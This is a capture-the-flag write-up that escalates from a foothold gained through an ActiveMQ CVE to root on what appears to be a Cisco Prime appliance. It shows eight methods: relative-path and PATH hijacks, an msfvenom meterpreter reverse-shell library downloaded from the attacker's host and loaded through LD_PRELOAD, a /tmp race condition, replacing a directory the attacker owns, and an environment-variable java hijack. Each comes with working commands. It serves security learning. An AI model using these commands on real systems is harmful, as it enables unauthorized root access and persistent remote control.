# Prime Time (root)

## Challenge

Author: nordbo, tmolberg

> Can you escalate your privileges to root?
> \
> \
> Use the same instance as for Prime time (user)

## Foothold and Shell

The machine was vulnerable to CVE-2023-46604, an exploit targeting Apache ActiveMQ. Using [this exploit](https://github.com/evkl1d/CVE-2023-46604/tree/main), we gained a non-tty shell. For convenience, we added our public keys to `/home/activemq/.ssh/authorized_keys` to enable easier access.

```bash
mkdir -p /home/activemq/.ssh
chmod 700 /home/activemq/.ssh
echo "<PUB-KEY-HERE>" > /home/activemq/.ssh/authorized_keys
chmod 600 /home/activemq/.ssh/authorized_keys
```

## Enumeration

Running `sudo -l` revealed the commands that the user `prime` is permitted to execute as root, along with their configurations.

```bash
sudo -l

Matching Defaults entries for prime on ip-10-128-3-215:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset,
    env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User prime may run the following commands on ip-10-128-3-215:
    (ALL) SETENV: NOPASSWD: /opt/CSCOlumos/rcmds/
```

#### Explaination

- `(ALL)`: Allows `prime` to execute commands as any user, including root
- `SETENV`: Permits `prime` to set environment variables while using sudo
- `NOPASSWD`: No password required for the specified commands
- `/opt/CSCOlumos/rcmds/`: `prime` can run any commands in this directory with sudo
- `env_reset`: This setting resets the environment variables when using sudo.
- `env_keep`: Allows certain environment variables to persist when running commands with sudo.
- `secure_path`: Limits the `PATH` to specific directories when using sudo

#### Files

Taking a closer look at the directory `/opt/CSCOlumos/rcmds/`, we can see 87 files.

```bash
file -b /opt/CSCOlumos/rcmds/* | sort | uniq -c
      7 ASCII text
      4 ASCII text, with no line terminators
     68 Bourne-Again shell script, ASCII text executable
      8 POSIX shell script, ASCII text executable

```

Most of these files are shell scripts, including some with relative path dependencies, which could be exploited.

## PrivEsc #1

One of the files in `/opt/CSCOlumos/rcmds/`, `init.sh`, is used to set environment variables (e.g., `PATH`, `INSTALL_HOME`, `XMP_HOME`). It also includes validation functions like `sanitiseInputArgs` and `checkFileNameForInvalidChars` to sanitize inputs.

However, some scripts in this directory refer to `init.sh` using a relative path instead of an absolute path. This opens up an opportunity to hijack the script by providing our own `init.sh` in the current working directory, which would then be executed instead of the legitimate one.

```bash
grep "init.sh" /opt/CSCOlumos/rcmds/*

<...SNIP...>
checkHAReadiness.sh:. init.sh
checkManufacturer.sh:. init.sh
cleanADR.sh:. /opt/CSCOlumos/rcmds/init.sh
cleanarchive.sh:. /opt/CSCOlumos/rcmds/init.sh
<...SNIP...>
```

In fact, 38 of the scripts uses the relative path. So the idea here is to just create a file named `init.sh` in our current working directory and make the script execute that instead of the legitimate `init.sh`.

Lets take a look at `/opt/CSCOlumos/rcmds/checkHAReadiness.sh`

```bash
#!/bin/bash
. init.sh

#Sanitise all arguments. Make sure no unallowed chars are present in the arguements
for arg in "$@"
do
        sanitiseInputArgse "$arg"
        if [ $? -ne 0 ]
        then
                echo "Invalid characters found in arguement - $arg"
                exit 1
        fi
done

arg1=$1
arg2=$2


$INSTALL_HOME/bin/checkHAReadiness.sh $arg1 $arg2
```

At line 2 we see `. init.sh`. The `.` (dot) is shorthand for `source` which ensures that the script is executed in the current shell environment rather than in a new subprocess. In other words, any changes made to the environment will take effect and stay in the current shell context.

- `./init.sh` would search the current working directory for any executables named `init.sh`
- `init.sh` would search the directories specified in the PATH-variable.
- `. init.sh` checks current working directory and runs it in the current shell context.

### Exploit

To exploit this, create a file named `init.sh` and make it executable. `bash -pi` runs bash interactively in privileged mode where it ignores the usual initialization files, such as `~/.bashrc`, and keeps the environment variables. In other words, runs bash as root.

```bash
cd /tmp
echo "bash -pi" > init.sh
chmod +x init.sh
sudo /opt/CSCOlumos/rcmds/checkHAReadiness.sh

id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
cat /root/root.txt
EPT{5b2f8f8681b6621b519ef09adf371174}
```

---

## PrivEsc #2

The `init.sh` file sets environment variables for the scripts. Since we have `SETENV` permissions with sudo, we can provide custom environment variables. Let's examine the PATH variable.

The `PATH` variable specifies directories where the system searches for executables, checking each directory in order and running the first match it finds. By placing a custom directory at the beginning, we can hijack commands, tricking the system into running our scripts instead of the intended binaries.

The first few lines of `init.sh` are:

```bash
#/bin/echo $PATH
export PATH="$PATH:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin"


#INSTALL_HOME=${INTALL_HOME:-/opt/CSCOlumos}
INSTALL_HOME=/opt/CSCOlumos
export INSTALL_HOME
```

In line 2, the script modifies `PATH` by appending additional directories. Since the system searches `PATH` from left to right, we can potentially run any command we want by prepending our own path. For instance, if one of the scripts runs `lspci`, the OS will search each directory in `PATH` sequentially, executing the first `lspci` it finds. By prepending our custom path, we can redirect this to run any command we choose. A possible remediation could be to append the current path instead of prepending it.

On line 2 we can see that the scripts modifies the path. With this syntax, the effective `PATH` variable is the existing path pluss the other specified directories. Since the shell/OS (not sure what to write here) searches for the commands from left to right, we can make it run whatever we want. For example, lets say that one of the scripts runs `lspci`. The OS would then check the first directory in the PATH-variable, if that contains `lspci`. If not, contiune to the next one. Since the current PATH is prepended, we can make it run whaterver we want. One possible remidiation could be to append the current path, instead of prepending it.

Since this is kind of stupid, lets assume this is fixed. Can we still exploit it?

Some scripts like `ftpadmin.sh`, does not run `init.sh`, so they use whatever `PATH` we specify.

```bash
#ftpadmin.sh
#!/bin/bash
. /etc/sysconfig/clock
CD=`/usr/bin/dirname $0`
export XMP_HOME=${XMP_HOME:-/opt/CSCOlumos}
export INSTALL_ROOT=${INSTALL_ROOT:-/opt/CSCOlumos}

export SVC_NAME=vsftpd
export SVC_DISP_NAME="FTP Service"
export LOG_FILE=$XMP_HOME/logs/ftpadmin.log

USERNAME=${FTP_UNAME:-ftp-user}
PASSWD_EXPIRY_DAYS="+60"
FTP_PASSWD_PARAM=builtin-ftp-user

SECRETS_FOLDER=$XMP_HOME/conf/secrets
FTP_PASS_FILE=ftp.pwd
FTP_USER_SET_FLAG=".ftpUsrPass"
LOCKFILE=/var/lock/ftp/.passwdrstlck
PASSFILE=${SECRETS_FOLDER}/${FTP_PASS_FILE}
USRFLAGFILE=${SECRETS_FOLDER}/${FTP_USER_SET_FLAG}

PRIMEUSER=prime
GROUPNAME=gadmin

. $CD/inetsvcadmin.sh

mkdir -p /var/lock/ftp
mkdir -p $SECRETS_FOLDER
<...SNIP...>
```

This script doesn’t set `PATH` explicitly, and `mkdir` is a relative path. To exploit this, we’ll use a payload that sets SUID for `/bin/bash`. Just for variation, we will showcase some different payloads for the privesc.

```bash
ls -la /bin/bash
-rwxr-xr-x. 1 root root 964536 Nov 25  2021 /bin/bash

echo "chmod u+s /bin/bash" > /tmp/mkdir
chmod +x /tmp/mkdir
sudo PATH=/tmp:$PATH /opt/CSCOlumos/rcmds/ftpadmin.sh

ls -la /bin/bash
-rwsr-xr-x. 1 root root 964536 Nov 25  2021 /bin/bash
```

Now we can see that `/bin/bash` has `rws` set.

```bash
/bin/bash -p

bash-4.2# id
uid=998(prime) gid=995(prime) euid=0(root) groups=995(prime),0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Other scripts, like `physical_appliance_hyper_v_check.sh`, also prepend to `PATH` without calling `init.sh`:

```bash
# physical_appliance_hyper_v_check.sh
# !/bin/sh
export PATH=$PATH:/usr/bin:/bin:/usr/sbin:/sbin

echo "Display"
lspci | grep -i Hyper-V
```

We can use the same method here.

```bash
echo "bash -pi" > /tmp/lspci
chmod +x /tmp/lspci
sudo PATH=/tmp /opt/CSCOlumos/rcmds/physical_appliance_hyper_v_check.sh
/bin/bash -p
```

---

## PrivEsc #3

With `SETENV` permissions, we can set the `PATH` variable to run malicious code as sudo, but we can also leverage the `LD_PRELOAD` environment variable. `LD_PRELOAD` allows users to specify custom shared libraries to be loaded before executing the specified script or command.

First, we create a shared object file (`.so`) using `msfvenom`:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.128.1.50 LPORT=4444 -f elf-so -o revshell.so

python3 -m http.server 80
```

Next, we download `revshell.so` on the target machine:

```bash
wget http://10.128.1.50/revshell.so
chmod +x revshell.so
```

To catch the reverse shell, we use the Metasploit `multi/handler` module:

```bash
msfconsole
use multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 10.128.1.50
run
```

Finally, we run the following command to gain a root-level reverse shell:

```bash
sudo LD_PRELOAD=/tmp/revshell.so /opt/CSCOlumos/rcmds/fdiskl
```

Once connected, we can verify root privileges:

```bash
meterpreter > shell
id
uid=0(root) gid=0(root) groups=0(root)
```

This is the method we actually used to solve the challenge.

---

## PrivEsc #4

While investigating the scripts, we noticed some of them write some files to `/tmp`, then run `chmod +x` on the files and execute them immediately afterward. This behavior can lead to a race condition, where we exploit the timing between writing to the files and the execution of them.

A race condition occurs when a program`s execution depends on the precise timing of multiple events. If we can predict and manipulate this timing, we can "win" the race by replacing or modifing the file the program intends to execute.

The following scripts exhibit this behavior:

- `rman_cmds_wrapper.sh`
- `shellfile_cmds_wrapper.sh`
- `sql_cmds_wrapper.sh`

Here’s an example of the relevant code from one of the scripts:

```bash
<..SNIP...>

if [  "$1" = "rmanExec.sh" ]; then
	chmod +x  /tmp/rmanExec.sh

	/tmp/rmanExec.sh

<...SNIP...>
```

#### Explaination:

If the first argument is `rmanExec.sh`, the script makes `/tmp/rmanExec.sh` executable and then runs it. We can exploit this by rewriting `/tmp/rmanExec.sh` with our payload right before it’s executed.

### Exploit

In the first session, we loop the vulnerable script with a small delay to trigger the exploit:

```bash
while true; do sudo /opt/CSCOlumos/rcmds/rman_cmds_wrapper.sh rmanExec.sh; sleep 0.01; done
```

In another session, we create an exploit script to overwrite `/tmp/rmanExec.sh` repeatedly until we win the race:

```bash
#!/bin/bash

while true; do
    # Write the command to set SUID on /bin/bash to /tmp/rmanExec.sh
    echo "chmod u+s /bin/bash" > /tmp/rmanExec.sh

    # Check if /bin/bash has the SUID bit set
    if [ -u /bin/bash ]; then
        echo "[!] /bin/bash has SUID set. Exiting loop."
        break
    fi

done
```

Executing this script with `time` shows how long it takes to win the race:

```bash
time ./exploit.sh
[!] /bin/bash has SUID set. Exiting loop.

real	0m3.422s
user	0m0.368s
sys	0m0.588s

/bin/bash -p
id
uid=998(prime) gid=995(prime) euid=0(root) groups=995(prime),0(root)
```

This approach successfully sets SUID on /bin/bash, granting root access.

---

# PrivEsc #5

Although we have sudo permissions to run anything in `/opt/CSCOlumos/rcmds/`, we don’t have write access to the scripts within this directory. However, since we own the parent directory, we can exploit this by renaming the `rcmds` folder, creating our own with the same name, and adding a custom script to execute with sudo.

First, let’s check permissions on `/opt/CSCOlumos/`:

```bash
ls -la /opt/CSCOlumos/

total 172
drwxrwxr-x. 60 prime root     4096 Nov  7 01:16 .
drwxr-xr-x.  4 root  root       39 Oct 15 03:42 ..
```

Since we have ownership, we can rename the existing `rcmds` directory (for backup) and create a new one with our own script inside.

```bash
cd /opt/CSCOlumos
mv rcmds/ rcmds2
mkdir rcmds
cd rcmds
echo "bash -pi" > shakirashakira.sh
chmod +x shakirashakira.sh
sudo /opt/CSCOlumos/rcmds/shakirashakira.sh
```

Once executed, we gain root privileges:

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

---

## PrivEsc #6 (Untested)

There is a potential command injection vulnerability in `DeployIPSecTunnel.sh` and `DeleteIPSecTunnel.sh`. While most scripts use sanitization functions from `init.sh`, some scripts do not, allowing unsanitized input.

```bash
/usr/sbin/ipsec auto --add Device_$1
/usr/sbin/ipsec auto --up Device_$1
```

Since `ipsec` was not installed on the system, we could not verify this exploit. Additionally, testing with another version of ipsec produced errors, as it did not recognize auto as a valid command.

---

## PrivEsc #7

Similar to `LD_PRELOAD`, we can use the `LD_LIBRARY_PATH` environment variable to force commands to load our custom libraries. `/opt/CSCOlumos/rcmds/fdiskl` uses `/sbin/fdisk` so to determine which shared libraries `/sbin/fdisk` relies on, we use `ldd`:

```bash
 ldd /sbin/fdisk

	linux-vdso.so.1 =>  (0x00007ffff5b61000)
	libblkid.so.1 => /lib64/libblkid.so.1 (0x00007f281b582000)
	libuuid.so.1 => /lib64/libuuid.so.1 (0x00007f281b37d000)
	libc.so.6 => /lib64/libc.so.6 (0x00007f281afaf000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f281b7c2000)
```

To exploit this, I renamed the shared object file created in PrivEsc #3 to `libblkid.so.1` and used it to gain a reverse shell:

```bash
sudo LD_LIBRARY_PATH=/tmp /opt/CSCOlumos/rcmds/fdiskl
```

---

## PrivEsc #8

In this privilege escalation technique, we exploit the environment variables in the `ftpadmin.sh` script, particularly `$INSTALL_ROOT`, which determines the path for Java executables. Since the script runs as sudo and checks `INSTALL_ROOT` for paths, we can modify it to execute our own Java script, gaining elevated privileges.

In `ftpadmin.sh`, the script calls Java programs from `$INSTALL_ROOT/jre64/bin/java` to manage FTP credentials. By modifying `$INSTALL_ROOT` to point to a directory we control (e.g., `/tmp`), we redirect the script to execute a custom version of java instead of the intended executable.

```bash
#!/bin/bash
. /etc/sysconfig/clock
CD=`/usr/bin/dirname $0`
export XMP_HOME=${XMP_HOME:-/opt/CSCOlumos}
export INSTALL_ROOT=${INSTALL_ROOT:-/opt/CSCOlumos}

export SVC_NAME=vsftpd
export SVC_DISP_NAME="FTP Service"
export LOG_FILE=$XMP_HOME/logs/ftpadmin.log

USERNAME=${FTP_UNAME:-ftp-user}
PASSWD_EXPIRY_DAYS="+60"
FTP_PASSWD_PARAM=builtin-ftp-user

SECRETS_FOLDER=$XMP_HOME/conf/secrets
FTP_PASS_FILE=ftp.pwd
FTP_USER_SET_FLAG=".ftpUsrPass"
LOCKFILE=/var/lock/ftp/.passwdrstlck
PASSFILE=${SECRETS_FOLDER}/${FTP_PASS_FILE}
USRFLAGFILE=${SECRETS_FOLDER}/${FTP_USER_SET_FLAG}

PRIMEUSER=prime
GROUPNAME=gadmin

. $CD/inetsvcadmin.sh

mkdir -p /var/lock/ftp
mkdir -p $SECRETS_FOLDER

#Set the password to linux account and generate a log event.
function updatePasswd {
    logger -p local0.info "Auto resetting of password for $USERNAME"
    resp=`echo "$1" | passwd --stdin $USERNAME`
    logger -p local0.info "$resp"
    log2file "Updated FTP account password"
}

############################################################################################################################################################################
#As of not FTP password needs to be set in three places.
#     1) $PASSFILE -> Stored using symmetric encryption for consumption of other components.
#     2) Data base for legacy reasons. This will be eventually removed in Lanani. DB storage makes a dependency that both DB and main JVM should be up for password reset.
#     3) Linux account
#
#Logic of this function is as follows:
#     1) $PASSFILE is the primary source for the password.
#     2) Every time this function is called, password will be read from this file and updated to other two places.
#     3) If $USRFLAGFILE file is present, it means the password is set by user.
#     4) If FTP_USER_PASSWD env is set, it means this function is called with user specified password.
#
#Flow is as follows:
#     1) If FTP_USER_PASSWD env is set, it means this is called with user specified password. $FTP_USER_PASSWD will be saved to $PASSFILE
#     2) If it is not set & $USRFLAGFILE is NOT present, it means, user has not set a password yet. Generate a random and save to $PASSFILE
#     3) Read passwd from $PASSFILE and synch to other two places - database and linux account
###############################################################################################################################################################################
function resetAndSynchPasswd {

    #If user configured password has expired, delete the flag that indicates current password is user configured password so that it will get reset to a random passwd.
    #find ${SECRETS_FOLDER} -name ${FTP_USER_SET_FLAG} -mtime $PASSWD_EXPIRY_DAYS -exec rm -f {} \;
    find ${SECRETS_FOLDER} -name ${FTP_USER_SET_FLAG} -mtime ${PASSWD_EXPIRY_DAYS} -type f | while read file1
    do
        log2file "FTP Accnt password expired. Resetting the password"
        rm -f $file1
    done

    isSecondary=`grep -w "role=\\"secondary\\"" /opt/CSCOlumos/conf/rfm/classes/com/cisco/common/ha/config/haSettings.xml`;
    if [ -n "${isSecondary}" ]; then
        isSecondarySync=`grep -w "state=\\"22\\"" /opt/CSCOlumos/conf/rfm/classes/com/cisco/common/ha/config/haSettings.xml`;
        if [ ! -n "${isSecondarySync}" ]; then
            log2console "WARNING: Password change not allowed when secondary in sync state. Aborting"
            return 1
        fi
    fi

    log2console "Updating FTP password"

    if ! id -a $USERNAME &> /dev/null
    then
        log2file "FTP account does not exist - $USERNAME"
        return 1
    fi

    password=""
    (
       flock -n 200
       if [ "$?" -ne 0 ]
       then
          log2console "FTP password update is already in progress"
          return 1
       fi

       trap '' 2 3
       . $XMP_HOME/conf/allenv.env

       if [ ! -z "$FTP_USER_PASSWD" ]
       then
           log2console "Saving FTP account password in credential store"
           password="$FTP_USER_PASSWD"
           unset FTP_USER_PASSWD
           FTP_PASSWD_PARAM=location-ftp-user
           #Save the password to file
           $INSTALL_ROOT/jre64/bin/java -Djava.system.class.loader=com.cisco.xmp.classLoader.XMPSystemClassLoader  \
                                        -Dcom.cisco.xmp.XMPHome=$XMP_HOME -Dxmp.conf.dir=$XMP_HOME/conf \
                                        -cp $XMP_CLASSLOADER_CLASSPATH com.cisco.xmp.xmp_dbCredential_mgmt.DBCredentialMain -e "$password" $PASSFILE $USERNAME &>> $LOG_FILE
           #Though the name suggests, DBRandomPasswdMain does not do anything specific to DB. It just calls org.apache.commons.lang.RandomStringUtils.randomAlphanumeric(charCount).
           date -d "${PASSWD_EXPIRY_DAYS} days" +%s > $USRFLAGFILE
       elif [[ ! -e $USRFLAGFILE || ! -e $PASSFILE ]]
       then
           log2console "Generating a random generate password for FTP account and saving it in store"
           password=`$INSTALL_ROOT/jre64/bin/java -Djava.system.class.loader=com.cisco.xmp.classLoader.XMPSystemClassLoader  \
                                                  -Dcom.cisco.xmp.XMPHome=$XMP_HOME -Dxmp.conf.dir=$XMP_HOME/conf \
                                                  -cp $XMP_CLASSLOADER_CLASSPATH com.cisco.common.util.DBRandomPasswdMain -c 15` &>> $LOG_FILE

           #Save the password to file
           $INSTALL_ROOT/jre64/bin/java -Djava.system.class.loader=com.cisco.xmp.classLoader.XMPSystemClassLoader  \
                                        -Dcom.cisco.xmp.XMPHome=$XMP_HOME -Dxmp.conf.dir=$XMP_HOME/conf \
                                        -cp $XMP_CLASSLOADER_CLASSPATH com.cisco.xmp.xmp_dbCredential_mgmt.DBCredentialMain -e "$password" $PASSFILE $USERNAME &>> $LOG_FILE

       fi

       #TODO:  Needs to review the permission of these files..
       \chown $PRIMEUSER:$GROUPNAME $PASSFILE &>> $LOG_FILE
       \chmod ug+rw $PASSFILE &>> $LOG_FILE

       if [ -z "$password" ]
       then
           #Password is neither passed by user nor random generated. User set password is already there in the file. Read it.
           log2console "Reading password from store for synching"
           password=`$INSTALL_ROOT/jre64/bin/java -Djava.system.class.loader=com.cisco.xmp.classLoader.XMPSystemClassLoader  \
                                                  -Dcom.cisco.xmp.XMPHome=$XMP_HOME -Dxmp.conf.dir=$XMP_HOME/conf \
                                                  -cp $XMP_CLASSLOADER_CLASSPATH com.cisco.xmp.xmp_dbCredential_mgmt.DBCredentialMain -d $PASSFILE $USERNAME | sed "s/password is //"`
       fi

       #Now synch the password to DB and linux account
       if [ ! -z "$password" ]
       then
           #TODO: Should we keeo DB update outside the lock??? Just incase this hangs, it should not impact next update???
           log2console "Synching FTP account passwd to database store - $FTP_PASSWD_PARAM"

           $INSTALL_ROOT/jre/bin/java -Xmx670m  -Djava.system.class.loader=com.cisco.xmp.classLoader.XMPSystemClassLoader  \
                                                -Dcom.cisco.xmp.XMPHome=$XMP_HOME -Dinstall.dir=$INSTALL_ROOT \
                                                -Dxmp.conf.dir=$XMP_HOME/conf \
                                                -Duser.timezone="$ZONE" \
                                                -cp $XMP_CLASSLOADER_CLASSPATH com.cisco.packaging.PasswordAdmin $FTP_PASSWD_PARAM ftp-user "$password" &>> $LOG_FILE

           if [ "$?" -ne 0 ]
           then
              log2console "Warning: Failed to update passwd in data store. Password will not be reset"
              return 1
           fi


           #log2console "Synch password to FTP acnt $password"
           log2console "Synching FTP account password to system store"
           #TODO: Updating linux account every time will generate logger event. Will user be concerned?
           updatePasswd "$password"
       fi

       log2console "Completed FTP password update"
       trap - 2 3

     ) 200>/var/lock/ftp/.passwdrstlck
}

#Reset the flag that indicates user has set the password, so that from next start onwards, it will reset random generated password. As of now, only for development purpose.
function unsetUserSetPasswd {
    log2console "Removing the FTP password set by user"
    rm -rf $USRFLAGFILE
    unset FTP_USER_PASSWD
    resetAndSynchPasswd
}

case "$1" in
   start)
      start
   ;;
   stop)
      stop
   ;;
   restart)
      restart
   ;;
   status)
      status
   ;;
   quietStatus)
      quietStatus
   ;;
   state)
      state
   ;;
   isRunning)
      isRunning
   ;;
   isRunningVerbose)
      isRunningVerbose
   ;;
   appstart)
      appstart
   ;;
   apprestart)
      apprestart
   ;;
   resetPasswd)
      resetAndSynchPasswd
   ;;
   unsetPasswd)
      unsetUserSetPasswd
   ;;
   *)
      echo "Usage: $0 {start|stop|restart|status|state|resetPasswd}"
      exit 10
esac
```

To reach the `$INSTALL_ROOT/jre64/bin/java` we need to bypass some checks. For example `if [ ! -z "$FTP_USER_PASSWD" ]` checks if the `FTP_USER_PASSWD` is non-empty. If `FTP_USER_PASSWD` contains a value, the script proceeds.

There is also a check `if ! id -a $USERNAME &> /dev/null` where `$USERNAME` is defined as `${FTP_UNAME:-ftp-user}`. So we can specify `FTP_UNAME` to be `root` or some existing user one the system.

After some trial and error, we found out we could set the variables to something like this:

```bash
FTP_UNAME=root FTP_USER_PASSWD=root INSTALL_ROOT=/tmp XMP_HOME=/tmp
```

So lets create `/tmp/jre64/bin/java` and trying to run the script again.

```bash
mkdir -p /tmp/jre64/bin/
echo "chmod u+s /bin/bash" > /tmp/jre64/bin/java
chmod +x /tmp/jre64/bin/java
sudo FTP_UNAME=root FTP_USER_PASSWD=root INSTALL_ROOT=/tmp XMP_HOME=/tmp /opt/CSCOlumos/rcmds/ftpadmin.sh resetPasswd

/bin/bash -p
id
uid=998(prime) gid=995(prime) euid=0(root) groups=995(prime),0(root)
```

---

## Conclusion

This challenge was truly akin to "Swiss cheese"—multiple vulnerabilities layered together. Some methods were similar and could be easily patched, but we explored various paths to test the possibilities. It was a fun and insightful challenge!

A big thank you to everyone involved in the testing and analysis. Let’s hope Cisco takes these findings seriously and addresses these vulnerabilities promptly.
